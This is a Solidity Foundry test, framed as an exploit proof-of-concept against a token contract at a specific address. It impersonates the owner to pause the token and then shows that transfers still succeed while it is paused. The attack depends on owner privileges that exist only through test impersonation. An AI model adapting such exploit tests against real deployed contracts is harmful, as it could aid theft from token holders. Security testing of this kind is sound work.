pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IByTradeToken {
    function owner() external view returns (address);
    function pause() external;
    function paused() external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe8bd1CA97F8a0582335407B40B0576Df641fA94C;
    address attacker = address(this);
    IByTradeToken token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IByTradeToken(TARGET);
        owner = token.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address recipient = 0x1337000000000000000000000000000000000001;
                uint256 amount = 1 ether;

                vm.startPrank(owner);

                // 1. As owner, pause the contract
                token.pause();
                assertTrue(token.paused());

                // 2. As owner, transfer tokens while the contract is paused
                token.transfer(recipient, amount);

                vm.stopPrank();
        assertGt(token.balanceOf(0x1337000000000000000000000000000000000001), 0, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
